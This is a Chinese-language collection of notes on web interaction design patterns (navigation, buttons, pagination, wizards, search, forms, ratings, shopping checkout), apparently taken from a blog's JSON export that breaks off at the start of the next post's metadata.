回到顶部链接 问题：用户需要返回到页面顶部； 方案：在内容区放置一个链接，点击回到顶部； 场景 页面很长，超过两屏，且用户有返回顶部的需要； 常用于长页面，如文章页面或者FAQ页面，用户在问题与答案之间跳跃； 长文本场景下，用户需要返回导航； 做法 在特定位置放置链接，标签“回顶部”，可带或可不带图标； 特定位置一般为段落底部，或者“块”底部； 链接会回到锚点位置如页面顶部； 一般用于两个场景： 回到导航； 回到页头； 如果是第一种，建议使用双重导航，在底部再放置一次导航会比回顶部的链接更加友好 原因：此模式可方便用户从任何滚动的位置回到导航，尤其是对于哪些使用滚动操作不方便的用户； 足迹菜单 问题：用户需要在层级结构中寻找信息 方案：在路径中显示菜单 场景：网站层级浅，但每级的项目多； 做法：类似面包屑，但结合了菜单项；可纵向或横向布置；每个项目可带用户回到上一级； 原因：面包屑与菜单的混合效果，消耗很少的空间，可显示当前级下面的很多菜单项； 基础交互 操作按钮 缘起： 在当前查看页面的上下文中，用户需要进行相关的操作，用户需要被告知该操作的重要性，以及和页面上其他操作之间的关系； 解决方案 使用动词做为按钮的标签 使用可点击的按钮 适用场景 用户通过链接在网站内进行浏览，但并非所有链接在概念上都表示同样的事物；普通的链接用于浏览和导航，不会产生副作用，用于页面之间的跳转；其他一些链接则会创造特定效果，如开始或结束一个流程，或将信息添加到数据库中；例如，通过搜索框进行搜索，购买产品，提交转账申请等等；这种链接是一些重要的操作，它们会造成一些不容易撤销的结果，或者它们对于用户具备某种重要性； 操作按钮常出现于产品详情面、产品建议页或搜索结果页；它适用于用户对展示对象产生兴趣并想采取重要的行动；典型的操作有购买、报价、搜索，添加到购物车等；这些操作很重要，因为它们是页面上主要任务的组成部分； 使用方法 常用浮起按钮，易于跟文字链接区分开来；也因此比文字链接更吸引视觉注意力，由于其浮起的特点，暗示用户可点击；按钮可使用系统默认样式，但更经常是匹配整体页面样式；如果使用图标，立体更能突出可点击的效果，因此尽量避免使用扁平图标；按钮颜色应不同于页面的背景色，以便能突出显示；按钮不要太小，越大越容易点击；按钮的标签应该使用动词； 按钮应放置在操作的对象旁边；通常位于对象的右上角；此种形式，应该确保滚动时按钮时时可见；表单的按钮是个例外，它一般位于右下角；如果是列表的按钮，则通常同时放置在列表上部和下部； 分析 按钮的视觉外观使其能明显区别于文字链接；吸引更多注意力，刚好匹配它作为重要操作的特点； 新手指南 缘起：用户需要了解可以操作的内容，以及学习如何操作 解决方案：通过多个步骤向用户展示如何操作 适用场景 网站有一些不常见的功能； 展示一些非网站本身的事物（如仪器设备）的操作办法； 使用方法 操作指南是向导模式的一种； 将事情拆分为几个主要的步骤，然后罗列出来，易于用户理解； 用户可以选择其中一个步骤查看，或者查看所有的步骤； 为了让学习效果更好，用户可以在每个步骤中进行操作，以模拟真实的使用场景； 分析 此模式类似一个人在旁边讲解一个复杂的事情； 分页指示器 缘起：用户需要浏览很长的清单并找到最感兴趣的对象； 解决方案：将结果分页展示，每页显示固定数量，便于用户从某一页跳转到其他页 适用场景 常用于有大量项目需要展示的情况； 适用于单页区域展示不下内容时 项目一般按某种顺序排列，以便用户可以在起始点找到想要的结果；例如搜索场景经常使用此模式； 分页模式通常和表单生成器配合使用，例如邮箱应用； 单页的项目数量一般在10-200之间； 项目可以是任何东西，如邮件头、姓名、照片、电话号码等等； 使用方法 在清单下方显示分页导航 各具体页面有直接访问的链接，同时可以通过上一页和下一页来翻页 每页显示5-10个项目 显示总页数 通过标题提示页面内容； 典型的结构为：项目数，上一页，页码，下一页 “上一页”和“下一页”仅在适用的情况下显示； 另外，可以添加首页和末页的链接； 页码一般字体较小，因此不易点击；因此可以将页码分成范围段，如11-20，21-30；此种方式的缺点是如果项目很多，空间可能不够；此时可以通过显示当前页再加上前后几页以及省略号…来解决； 分析 页码指示器告诉用户重要的信息，包括总项目数量、多少正在查看、如何看到余下的内容； 之所以放在下方，是因为当用户浏览完项目时，底部位置是其最需要页面指示器的地方； 分页很常见且普通接受，但Ajax的应用有可能免用分页指示器，当用户滚动的时候再显示结果； 折叠菜单 缘起：用户需要从一组项目中选择其中一项 解决方案：在常规的菜单中放置一组选项，一次可选一个； 适用场景：选项很多，但空间有限，只能放5-8项；列表不能太长，不然不方便选择，一般不超过3个； 使用方法：在常规的空间内放置菜单，两端放上箭头，展示菜单项时悬停高亮； 分析：优点是省空间 幻灯片 缘起：用户想查看一组图片 解决方案：每张照片显示几秒钟，提供播放控制，包括前进、后退、暂停、开始等； 适用场景：常用于图片分享网站，如Flickr，Picasaweb； 使用方法 通常最大化屏幕用以展示图片，同时用尽量小的空间展示必需的控制按钮； 控制按钮一般图片放在上方或者下方 注意事项 如果按钮覆盖在图片上方，则一段时间后自动隐去； 播放的时间间隔可调整； 允许用户随时退出播放 图片切换加上转场效果，看起来更漂亮； 给图片加上标题或说明文字； 有时可以考虑加上图片缩略图，这样用户对下一张的图片有预期，但缺点是减弱了沉浸式体验感； 分析 图片在日常生活中也非常普遍；用户不用操作即可轻松的观赏图片；当错过图片或者要暂停时才使用控制按钮； 分步模式 缘起：用户需要按顺序查看或操作 解决方案：允许用户通过链接跳转到上一步和下一步 适用场景：用户需要线性的查看或操作对象；对象可以图片、搜索结果、一系列任务、购物等；当对象数量比较大时，分步模式可以辅助导航，例如分页；在向导模式中，分步模式即是做为主导航； 使用方法 下一步链接到后续步骤，上一步返回前面的步骤； 将按钮放在要操作的对象旁边，一般放上面，避免出现需要滚动的情况； 确保按钮位置固定，以便用户不需要移动鼠标即可进行点击； 上一步放左侧，下一步放右侧； 在第1步没有上一步，在最后1步没有下一步； 如果需要的话，上一步和下一步就再补充文字描述，例如上一张图片、下一步图片； 使用分步模式浏览图片时，考虑使用缩略图； 当在任务处理中使用分步模式时，使用操作按钮模式，以吸引更多用户的注意力； 分析 分步模式是最基本的导航方式之一； 通过使用向前和向后的标签强调线性特性； 结合缩略图，让用户提前知道要去哪里； 更长的文字标题，或者缩略图，都可以增大点击区域，使其更容易选择； 向导模式 缘起：用户想达到某个目标，但完成目标前，需要做出几项可能用户未知的决策； 解决方案：带领用户一步一步的完成整个任务；向用户展示哪些步骤已经完成，哪些未完成； 适用场景 非熟练用户需要完成一个不经常处理的复杂任务； 该任务由几个子任务组成； 子任务数量不多，约在3-10个； 用户想完成最终目标，对需要完成的步骤不熟悉或者不感兴趣； 子任务有一定顺序，但也并总是相互独立，例如处理下一个任务前需要先完成某个子任务； 需要完成几个任务后才达到目的；由于每个子任务中决策不同，最后完成的任务数量会不一样； 使用方法 当开始复杂任务时，用户被告知需要完成几个步骤后可达到最终目的； 用户通过下一步的按钮可跳转到后续任务； 如果完成当前步骤前不允许进入下一步，则需要给出提示； 用户可通过上一步的按钮修改前面的结果； 用户被告知每个子任务的目的；用户可以实时清楚自己所处的位置；并知道总共由哪些步骤组成； 当任务最终完成时，给用户成功的提示； 如果可以的话，当用户熟悉默认选项时，允许用户使用快捷方式一键完成任务（例如亚马逊的一键下单）； 在任何时点都允许用户随时退出； 分析 导航按钮暗示用户处于分步模式中； 每个任务使用一致的样式，强化存在一系列步骤的概念； 任务序号告知用户有哪些步骤需要完成以及当前所处的位置； 优点：学习成本低，容易记忆； 缺点：任务处理时间长； 由于用户被强制按顺序完成任务，不容易出现遗漏； 搜索 高级搜索 缘起：用户需要在数量众多的项目中，寻找所需要的项目； 解决方案：提供高级搜索功能，包括更多的匹配项、搜索范围、输出选项等； 适用场景： 由于信息类网站包含的信息太多，如电商、跨国公司、门户网站、图书馆等，简单的搜索框无法保证用户总是能搜索到想要的信息； 相对普通搜索，高级搜索增加更多的搜索项；高级搜索主要面向中高级用户，这些用户需要充分利用搜索引擎以便找到所需信息；该类用户对所要搜索的项目了解更多的信息；他们很可能知道项目的分类，并试图找到该项目； 使用方法 高级搜索一般搭配普通搜索框使用，主要在三方面进行加强： 条件：此功能控制搜索引擎如何处理关键字的组合；一般有与、或、非等三种；如果支持与和或搜索，显示“匹配所有项”和“匹配任意项”，而不是“与”和“或”，因为人们经常搞不清楚布尔值的意思，因此应避免使用；对于专家用户，可支持“与”和“或”的使用，但需要通过搜索建议，告知用户操作的可行性； 范围：指哪些项目可被搜索，哪一些不可以；通过设置查询条件，范围限制了搜索结果的可能性；例如，特定子网站的搜索结果、项目的类别（文章、视频、音频等）、项目的属性（标题、日期、地点、大小、作者）；查询范围让用户更便捷，因为它允许用户查询网站的特定元素； 输出控制：允许用户设置搜索结果的展示；例如排序、分页大小 可考虑允许用户针对搜索结果做进一步筛选，这样用户可以查得更深入；通过在搜索页中增加“在结果中搜索”的链接来实现，允许用户添加搜索关键字； 分析 此模式使得用户可以更全面的掌控搜索；同时要求用户对数据有深入了解，通常适用于专家用户；大多数对如何使用与和或有困难，因此建议用“所有项目”和“任何项目”来替代； 自动填充 缘起：用户想输入大集合下的一个标签 解决方案：展示与用户输入的标签相同名称的可能选项； 适用场景 自然地，自动填充常作为表单的组成部分；常用于搜索框，或者邮件地址栏；也用于航班目的地的输入；在所有场景中，列出有可能的选项有助于用户更快完成任务； 使用方法 当用户开始输入字符时，应用开始查询匹配的项目，并将结果显示在输入框的下方，用户通过移动光标或者输入关键字来选择所需的结果； 分析 减少用户的记忆负担，允许用户用更少的步骤定位到所要项目，而一般情况下则需要录入完整的标签名称； 帮助向导 缘起：用户需要帮助，或想到达某个具体的页面； 特点：专注于少数主题，通过上下步骤在树结构下引导查找；渐进缩小范围； 适用：用户不知道自己要找什么，或者缺少关键字，难以用搜索来定位； 搜索框 缘起：帮用户查找信息； 支持一些特殊字符的用法，包括+、-、and&#x2F;or、空格等； 图标、输入区、按钮、下拉框（如需）、用法提示（如需）； 页面标题、描述、分类、结果数量、页数； 搜索区 某个特定区域放置搜索功能； 做为辅助，非主导航； 与网站地图、网站索引、高级搜索等功能使用；一个位置，集合各项功能； 搜索结果 排序、分页、具象展示、短描述、相关推荐、分类、特殊匹配项优先展示； 页面标题、二次筛选、结果数量、搜索建议、购物车、对比； 搜索提示 一些搜索小功能的提示说明，如符号的使用，针对新手； 说明旁边再放个示例； 好处：降低用户对技术细节的学习成本； 搜索索引 大型网站，页面很多； 针对新手，不知道关键字，不熟悉网站的信息架构； 页面主题按字母罗列排序，供用户查找； 做为主导航和搜索的辅助； 网站地图 中型网站适用；小的主导航就展示完了，大的地图展示不下，查找效率不高； 让用户知道有什么，可以去哪里，如何组织，自己位置； 树状，各页可达，快速到达想去的地方； 页脚地图 适用中型网站； 缩小版的网站地图，但可以不严格是地图，可以重新组织链接，当作快捷方式的集合使用； 标签云 突出显示流行、热点、常用的标签； 相比数字，更直观的展示方式； 主题页 适用于有大量未知文件的网站 通过主题分类快速定位，速度比数量重要； 好处：用户可以更快的找到信息（文件很多，但证明被调用的是少数） 表单 密码强度条 缘起：为了确保用户设置的密码足够复杂，以免被恶意破解； 适用场景 让用户设置的账户密码不容易被破解或者被猜中； 提高用户密码的复杂度，以提高黑客的攻击门槛； 让用户知道什么样的密码是安全的，并按相关规则来设置 所见即所得 缘起：用户想生成富媒体和带格式的内容，但不知道如何使用HTML； 适用场景 用户想直接看到内容发布后的样式 用户不习惯使用HTML或者textile或者Markdown； 降低用户添加带格式内容的门槛； 提供将富媒体和格式内容上传网站的简易办法； 用户愿意花时间调整内容细节；所见即所得允许用户看到其编辑效果，增加其信心，带来快速和好看效果； 如果想保持HTML简洁则不适用；所见即所得会生成冗余的HTML代码； 如果需要兼容所有浏览器则不适用，所见即所得一般不能兼容所有浏览器，如果可以，也只是最新的浏览器版本； 验证码 缘起：识别数据提交者是人而非机器 输入反馈 缘起：用户录入数据到系统，期望得到录入结果的反馈 适用场景 当用户在网站上提交内容后，向用户提供反馈； 当用户提交表单时，向用户提示出现错误； 需要告知用户数据提交进行顺利； 解决方案 当用户使用表单提交数据时，经常会出现一些错误。本模式通过尽量减少错误的发生以提升用户体验。数据校验的方式很适用在提交表单时查出错误。告知数据格式要求的常用办法是将规则显示在输入框中；数据必须符合规则才能通过验证，这些规则包括 有录入内容：至少需要输入一些内容； 内容排除：一些非法的值，如使用admin作为用户名； 内容涵盖：数据必须包含某些值，或者在某个范围内； 内容接受：例如接受条款，通常使用复选框； 内容核对：两个输入框的值需要匹配，例如密码设置； 内容格式：例如邮件格式带@，年龄超过18岁等； 内容长度：例如密码不少于6个字符； 内容唯一性：例如用户名不可重复； 如果用户提交的内容验证通过，让用户知道一切顺利是很好的做法；甚至可以将用户引导到另一页面，让用户查看内容提交后的效果；如果验证未通过，则需给出错误提示，告知如何修复数据并要求重新提交；错误提示应包括： 出现错误了：在页面顶部浮窗提示（避免需滚动页面才能查看），建议使用红色暗示出现错误； 错误的位置：可以在提示中列出有错误的条目，并高亮（改变颜色）出现错误的输入框； 修复的方法：告知需要怎么做才能通过验证；可以在顶部显示，也可以在输入框旁边显示； 输入反馈的视觉效果应该与消息内容一致；正确使用绿色，中性使用黄色，错误使用红色；但注意，红色表示危险，用户是否正处于危险的状况？ 原理 当用户在网页上提交表单时，他将头脑按某种方式组织的数据，转化成按另一种方式组织的书面形式。由于每个人思维方式不同，在各自个性化的数据，转成系统定义的共同形式时，我们的录入方式也会不同。用户录入数据时肯定会包含错误，设计时应纳入考虑，让用户知悉其输入的数据不符合要求的格式。使用直观的视觉提示，用户能够发现错误并加予纠正。 讨论 可以说你应该花更多精力在用户提交数据前防止出错，而不是在出错后出好的提示；可以使用选择框来限制输入； 考虑提示使用的措辞，因为它们会影响用户的情绪，什么样的语气对用户是合适的？ 每个操作发生后给出明确的反馈。当用户及时得到系统的反馈时，会变得更加自信。反馈的类型包括通知、消息对话框、彩色可用或灰色不可用的按钮、加载动画、行内提示、工具提示、悬停效果等等。将用户的操作和系统对操作的反应之间变得更加无缝。 日期选择器 缘起：用户想基于日期或者日期范围查找或提交信息； 适用场景 用户想方便的选定日期或日期范围来提交、跟踪、排序、筛选数据； 如果用户习惯其他更高效的方式，则不适合使用；有些用户习惯手工录入； 如果文本输入的方式更方便，则不适合使用，例如生日，因为需要点击很多次，回退几十年； 使用方法 几种激活方式 点击链接； 选择输入框； 点击图标； 激活后，在当前页弹出日期浮窗供用户选择；通常显示一个月，但有些显示3个月，减少用户的点击负担； 特定格式 缘起：用户需要快速输入数据，但数据需要满足既定格式； 适用场景： 当使用常规控件如下拉框、单选按钮、多选按钮等，使得数据录入变得很复杂时； 完成任务的时间比目的重要； 需要收集的数据有固定格式；如邮编、日期、时间、手机号等； 当需要用户录入特定格式以便系统能够识别； 如果录入结果可以有多种解读方式，则不适用； 行内编辑 缘起：用户需要在页面上简单快速的编辑某个值 适用场景： 用户需要编辑的值不多，只有一个或少数几个，多则不合适； 适用于简单格式的字段，例如字符串，或者下拉框； 想让用户在当前页进行编辑，不用进入另外一个页面； 做法 悬停时显示可编辑的暗示； 输入框+确认+取消三件套； 完形填空 缘起：需要用户录入数据； 适用场景 输入框的标题无法解释待录入信息是关于什么内容； 输入框的标题太长太复杂，用户难以理解； 将输入框放入上下文中更易于理解； 输入框是必填信息，或者期待被填写；在句子中留空会触发用户不适，促使其完成信息录入； 只需要录入一个句子的少量信息；如果需要录入一个句子的大量信息，则会使用户厌烦；因为这样会迫使用户读完所有句子，并思考所录信息如何与上下文结合； 不适用于有大量字段需要录入的场景； 缺点：不适用于国际化多语言场景； 优点：有了上下文，更易于理解； 预览 缘起：用户想快速知道改变带来的效果； 适用场景 想让用户实时知道其生产的内容的展示效果； 如果没有预览，用户很难想象结果将呈现的样子； 如果输入明确，输出没有固定样式，则不适用； 优点：预览让用户在提交前可以看见结果，从而降低用户的不确定感，提高参与度和创造性，显得更加有趣，促进探索欲望，交互性更高；无需等待页面重新加载，结果实时呈现； 设置 缘起：用户需要在一个集中的位置，设置各项参数以控制应用的表现； 适用场景： 多数用户需要用到的参数 少数用户会用到的参数，但对满足其需求很重要； 常用的参数； 设置用户的偏好； 不适用于放置常用操作，此种场景更适合使用工具栏； 注意事项 有序组织设置项，可预期，作编号； 将不重要的设置项移动到单独的页面，例如“其他”； 规范命名，使用户能够快速明白设置项及当前值； 如果设置项很多，将用户感兴趣的优先放前面； 有效的默认值，多数用户会选择的值，保持中立，降低风险； 降低记忆负担，对设置项进行分组 7项以内：不分组； 9-16项：将同类别的分成多组； 超过16项：考虑分页，保持名称的延续性，子页面的标题与设置项相关联； 键盘快捷键 缘起：用户想快速的完成重复性的任务； 适用场景： 应用有重复性的任务，且涉及鼠标和键盘的切换； 可展开输入框 缘起：用户想进入更多面积和更少干扰的交互模式； 适用场景 需要将注意力聚焦在主交互中，而非输入控制中； 去除主交互的干扰元素； 做法 放大输入框，成为视觉中心； 可展开，可缩起；展开时，将其他不重要的元件下移，当需要它们的时候，再展示； 优点：将无关元素移出视线，界面更加整洁；适合场景如搜索、发帖、评论等； 拖放 缘起：用户需要将一个或者多个对象从一个位置移动到另外一个位置； 适用场景 让用户用更直观的操作完成复杂的任务 避免为了重新排版而强制用户进入另外一个页面； 优缺点： 很多用户在界面上有进行拖动操作的本能反应；很直观，隐喻模拟现实世界的操作； 尤其适用于移动列表中的条目； 拖动的可发现性不好，一般需提供备用方式； 兼容多种数据输入格式 缘起：用户想快速输入数据，系统能识别多种输入格式； 适用场景 当多选框、单选框、复选框会使得输入变复杂时； 输入速度的重要性超过达到目的； 适用于收集的数据有关某个主题，或者有明确的起始时间的事件； 适用于用户录入的数据容易被系统识别； 如果用户可能录入任何数据，则不适用；格式应限定于一个有限的小范围； 优点：降低用户与系统的交互门槛，节省空间；是否适用，取决于要求用户提供什么样的数据； 良好的默认值 缘起：用户需要录入数据，某些字段的默认值最大程度吻合待录入数据； 适用场景 用户需要从众多选项中进行选择，而其中一些选项有大概率匹配； 系统能够猜到用户想要录入的值； 适用于如果没有默认值，任务复杂度上升，输入项太多，把用户吓跑了； 如果选项需要用户仔细思考，则不适用，例如接受合同条款； 优点：节省用户的操作时间，让用户有时间去做其他任务； 输入提示 缘起：用户需要录入数据 适用场景 标题不能清楚说明，或者清楚说明时，太长了； 输入内容的示例 节省空间； 与标题配合，进一步阐释； 分析：适用于空间有限的场景，如果空间足够，则一般能放下长说明和长标题； 动态按钮 缘起：用户只需要呈现针对当前模态的操作； 适用场景 其他操作在当前状态下无需显示； 保持空间简洁，去除不相关或无必要的元素； 适用于多模态的场景，如开&#x2F;关，播放&#x2F;暂停； 注意事项 对称性设计，字体大小相同，外形相同，颜色可以不同； 常用于双态操作，如果开&#x2F;关，喜欢&#x2F;不喜欢，关注&#x2F;取消关注； 自动保存 缘起：用户想确保数据安全并进行保存，避免专注于工作忘了了保存； 适用场景：帮助用户专注生产内容，无须担心数据是否安全及保存； 注意事项： 合适的频率； 触发的方式：常规为保存按钮，但失去焦点也不错； 保存按钮，当自动保存后，按钮显示为“已保存”；当出现变更时，变回“保存”按钮； 分析 可以让用户免于忘记保存的烦恼；完全去掉保存按钮会让用户恐慌，所以按钮仍然保留；保存操作记录，并提供撤销功能； 撤销 缘起：用户想撤回已执行的错误操作 适用场景 给用户增加信息，鼓励用户探索操作； 损失数据的代价越大，越需要提供撤销功能； 只要有可能失去数据，都应提供撤销功能； 撤销不要使用警告； 分析 人非圣贤，用户总是会出现操作失误；此模式可鼓励安全探索，并增加用户的信心和乐趣； 给用户试错的空间，则用户学习的越快； 操作向导 缘起：用户想要完成的目标，可以拆分几个独立的子任务； 适用场景 用户需要完成的任务不止只有一个步骤，例如上传图片，包括选择、修剪、上传等； 需要完成的任务比较复杂，由几个子任务组成； 需要输入复杂的数据，拆成几个步骤更加容易完成； 需要指导，因为用户不熟； 最终目标的完成，取决于在上一个步骤选择的选项； 用户缺失相关专业知识； 用户需要按某种特定顺序完成任务； 完成度指示器 缘起：用户想要完成一个目标，但需要被告知什么时候自算完成以及如何完成； 适用场景 想让用户保持专注，以完成某个具体目标； 通过一系列小任务的存在感，确保用户完成 当最终目标依赖于完成连续性的任务时，不适用； 不适用于重要任务，而适用于如果完成结果会不错的任务类型；这个模式的目的即是要让用户比正常状态下多完成一些任务（比如学习计划、减肥计划、健身计划等）； 做法 拆分任务 提供建议 设置奖励：如头衔、奖杯等，允许用户分享成就； 剩余步骤（感觉跟操作向导很类似） 缘起：用户需要经几个步骤完成表单填写，需要指导； 适用场景 可拆分，可分页显示； 步骤太多，永无止境；（明示终点） 不适用只有1-2步； 不适用简单可预见的步骤； 行内提示 缘起：在交互发生位置，辅助说明； 适用场景 非直觉、难自说明； 示例； 鼓励使用； 帮助使用； 引导使用； 柔和引导新用户； 高级用户可隐藏； 做法： 记得提供“不再提示”的入口； 分析 比FAQ和帮助文档更好用； 可隐藏性可以减少干扰； 点赞 缘起：用户要表达对内容的偏好 适用场景 给用户权利表达内容偏好； 让用户提交内容； 信任用户判断； 用户社区过小不适用；（样本不足价值小） 做法 不同用户不同权重 嵌入插件 分析 鼓励参与，减少投入 限制反对次数，防止恶意； 内容质量有别； 乌合之众； 付费点赞 缘起：用户想付费提升自己内容的排名，以获得更多关注； 适用场景 允许付费绕过常规点赞机制； 例子：相亲类网站，脸书； 分析 一种广告 区别：付费的内容会有ad提示； wiki 缘起：公共信息协同编辑 适用场景 想让用户参与； 需要实时更新的内容 不适用： 不可变更的内容，如合同条款； 会过时的内容，如新闻； 分析 版本控制，可回滚； 可用于企业内部的知识库管理； 标示&amp;报告 缘起：让用户标示非法内容； 适用场景：UGC，数量大，难自控； 分析：对于UGC网站，此功能很重要；用户也乐于参与； 评级 缘起：用户想评级，以突出优质内容； 适用场景： 帮用户控风险，判断内容是否优质； 让用户帮助决定哪些是优质内容； 让一些人引导另一些人； 用户基数大； 用户值得信任； 用户基数小时，不适用 做法： 1-5级，可加评论；提交后给成功反馈； 显示平均分，有易判断； 提供评分说明； 展示高分项目； 搜索加权； 相关推荐； 分析 鼓励参与，辨别好坏，降低决策成本和风险，如购物； 思考： 谁来评：真实性与客观性； 评什么：目标物模糊，评分无价值； 要鼓励什么和不鼓励什么：防止恶意和滥用 可多维度拆分，评论将更有针对性，更有价值； 列表筛选 缘起：用户需要分类筛选表格数据； 适用场景 超过一页的大数据集； 筛选栏目可归类； 做法 下拉分类； 多分类组合与联动 如果有些筛选条件很常用，提供保存筛选参数的功能； 分析： 精准定位，缩小结果范围； 对于专家用户，复合筛选可达到报表或高级搜索的效果； 表格排序 缘起：列值排序 适用场景 有多列（大于10） 数据跨页 需对比列值； 列数少数据少不适用； 斑马行 缘起：区分不同行的值，一一对应； 适用场景 表格有多列，列间值接近，每列有多行； 行高不统一； 分析：便于阅读，但使得表格突出于页面； 仪表盘 缘起：多种数据快速扫视获取概要 适用场景：全局查看，发现趋势 ； 用法 实时查看几个关键数据 单一目标，围绕目标优先呈现相关数据； 三种 运营（每日） 管理（每月&#x2F;周） 分析：更详细的审视数据 分析： 实时快速监控 重要指标在上，次要指标在底； 简单易懂，可视化呈现； FAQ 缘起：用户有疑问 适用场景 多数用户有相似问题； 收集问题答案（实施和售后部门） 电商类、社区类网站； 做法 答案与问题挨在一起，同页，别跳转或者浮窗； 超过10个，编号； 很长，分主题，回顶部按钮； 全局问题全局入口；局部问题局域入口； 别用简写FAQ，用全称； 数据处理 可折叠面板 用户需要临时进一步查找详细信息或使用某些功能（但只是偶尔的）； 好处：页面更加整洁，常用于网页应用； 类似于手风琴，差别在于可以全部展开（如需）； 相对TAB，在使用空间上更加有效率； 缺点：部分用户可能不熟悉它的使用方式； 按需展开 隐藏一些过程信息，如果需要，可以点击展示完整显示； 收藏夹 浏览过程中将一些对象收集存放起来，以便后续进一步操作，常见的如购物车、收藏夹、待读清单、商品对比； 收藏夹的入口一般做成全局标签，以便可以在网站的各个地方快速访问； 嵌入覆盖 当用户只需要少量的进一步信息的时候使用，比如只有3-5行短信息，轻量级详情；此时用浮窗或者新页面过于麻烦； 列表操作 场景：用户需要对一组项目进行操作管理； 做法：显示整张列表，将操作按钮放置在旁边； 批量编辑：放上面（超过10个），放下面（少于10个）； 单个编辑：放在左侧或者右侧； 列表新增行时，高亮该行，以便让用户操作成功； 列表添加新项目 做法：在列表上方，按所需字段，放置一空行，旁边再放置一个“添加”按钮；可实现快速添加； 适用：需要手工大量添加项目，且项目信息很简单，少于4-5项； 缺点：如果需要输入的信息很多，则此模式不适用； 概览加详情 做法：有一个概览列表，点击出现一个详情页（面板）（可同页，或者不同页，如果屏幕面积足够，则同页比较好） 适用：用户主要通过概览视图浏览，当需要进一步查看详情时，再点击进入查看； 部件选择器 场景：用户需要选择一些部件，来完成某个项目的构建； 适用：部件超过10个；部件可分类；部件间相互独立； 按钮：移进，移出，结束； 标签 场景：将一个物体分成多个组，每组一个标签，用户通过切换标签浏览信息； 表格排序 允许用户表格的不同进行排序； 缩略图 允许用户从缩略图知悉概况，再决定是否做下一步动作，避免展示大图和下载视频耗费无谓的时间； 查看 WEB应用常使用：查看、编辑、返回模式； 查看提供内容集合和操作按钮汇总的安全区域； 个性化 窗口自定义 常用于提供个性化功能的场景，比如个人首页，通常需要用户注册和登录； 窗口模式，用户较熟悉，隐喻明显； 操作按钮：最小化、关闭、编辑等； 登录模式 一些信息需要存储，以便下次更方便的使用产品； 可允许先做为游客的身份使用，等必要时再要求用户注册； 用邮件注册的好处是可以使用邮箱找回密码； 如果登录频繁，允许将账号和密码存储在本地，避免每次重复输入； 提供忘记密码功能； 用户忘记是否注册，直接录入用户名和密码，此时可以跳转提示注册，而非简单的报错； 注册 尽量允许先使用再注册； 网站可以提供个性化服务时使用； 注册可以减少每次的重复信息录入时使用，比如常用地址薄； 不要问超过必要的信息，以免回答太多问题给用户带来挫败感，带来一些虚假数据； 提供查看和确认隐私政策的入口； 尽量不要强制注册； 购物 预订 飞机、酒店、汽车等； 允许用户多维度的灵活搜索，比如按日期，按价格等； 用户行为模式 搜索 对比&amp;决策 下单付款 系统流程：输入条件，搜索，展示结果，查看结果，下单； 产品对比 使用二维表格展示对比相同维度下各产品的参数； 不同的值 有或没有 产品顾问 将用户的决策拆分成多个考虑维度，做成选项，让用户逐项勾选偏好，最终生成建议；（有点类似向导模式） 适用于产品种类数目多，用户不专业，需要花费时间比较 产品定制 允许用户定制要购买的商品 用户更改参数，可以马上看到更改后的效果； 购买流程 步骤 识别客户 填写送货地址及勾选相关选项，如快递方式，送货时间等； 选择付款方式 预览 确认并下单 收到邮件确认 用户中途可随时退出； 常用向导模式，但如果一页可显示所有信息，则也可以不使用向导，更加简化； 减少页面其他元素的干扰（因为下单付款需要用户保持一定的注意力，避免被不相关的信息分散注意力，导致下单不成功） 常见注册才能下单，但这样不好，应该是先允许下单，下单成功后，再邀请注册；此时既保证了转化率，又能够利用下单信息减少注册输入； 进一步的邮件确认（貌似也不是很需要，除了亚马逊，国内的淘宝京东都没有这一步） 购物车 对于熟手，并不需要运费或物流，如虚拟产品，或者一般单项购买，非组合，则可以考虑一键下单； 全局可见，可看可删； 要素：名称，价格，库存，商品链接，总价，支付方式 可结算，可继续浏览 店铺位置 搜索名称或位置关键字，在地图上显示结果，对结果进行编号，与列表对应，或者悬停显示详细信息； 适用：有很多实体店；如果只有少数几个，则显示列表即可； 用户评论 适用：用户想知道其他用户的评价，以决定是否购买；适用网上购物，如果是线下，则用户可看实物； 方式： 允许用户添加评论； 文字，打分（星）； 注意事项 强制注册才能评论，避免恶意滥用 不干预，不审查； 利用抱怨处理展示服务 允许用户对评论打分，突出有用评论 可多维度打分； 虚拟商品展示 允许用户对商品的展示进行交互，模拟用户的体验试用感； 旋转，颜色，缩放，视频，细节图 制作成本高，但有效提高销售转化率 选择 国家选择 如果选项很多，用下拉框；如果不多，展示清单；清单按字母排序； 别跟语言选择混淆了； 如果国家众多，且展示区域有限，可以考虑按大洲分组 日期 编辑框+选择器复合，前者给熟练用户使用； 注意提供行内格式提示； 允许多种间隔方式，如-，&#x2F;和点； 支持2位数或4位数的年份； 需要对格式进行检验； 如果展示区域足够，可以直接展示日历，取代点击弹出的方式； 日期和月份&#x2F;年可以分开成两个选择框（某些特殊的情况下） 语言 显示语言原本的文字； 不要使用图标，例如国旗，因为国旗代表国家，而非语言，会造成误会； 位置够的话，列出清单；不够的话，使用下拉框； 各页固定位置常驻展示，避免回到首页切换； 投票 展示选项，投完展示结果； 避免投前展示结果，以免用户的判断被影响 评级打分 只要网站有社交的一面，评级打分都可能用得上，典型如电子商务网站； 评级的入口一般置于产品页的产品主名称附近，一般在下方或右侧； 有时可结合评论，此时需要有提交按钮； 输入数据 评论留言 留言提交后，显示在留言记录的最底下，并定位滚动条到相应的位置，高亮显示，目的是让用户确保已正确提交保存；除了留言内容，还应显示提交时间，提交人，以及一些其他可选信息； 限定输入格式 一些信息有特定格式，如果用户格式录错，导致数据不可用；因此正确的格式很重要，此时需要在界面上提示正确的输入格式，避免用户犯错； 填写表单 适用：需要用户提供某些信息，才可能为用户提供服务； 注意事项 文字含义：确保含义清晰，如有可能，辅以简单示例； 归类分组； 可选项仅在能带来明显好处的情况下使用； 良好的默认值可以加快输入效率； 支持键盘快捷键，例如TAB和ENTER； 其他 页脚栏 版权声明 使用协议 隐私协议 联系方式 热门清单 有一个大的选项集合，逐个查阅成本太高，提供最受欢迎的选项供用户参考； 给选项编号，5-10个，起名TOP 5等； 模板 缘起 解决方案 适用场景 使用方法 分析","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"跑步，该怎么跑","slug":"跑步，该怎么跑","date":"2016-09-03T15:08:00.000Z","updated":"2024-09-22T23:12:36.835Z","comments":true,"path":"2016/09/03/跑步，该怎么跑/","permalink":"http://example.com/2016/09/03/%E8%B7%91%E6%AD%A5%EF%BC%8C%E8%AF%A5%E6%80%8E%E4%B9%88%E8%B7%91/","e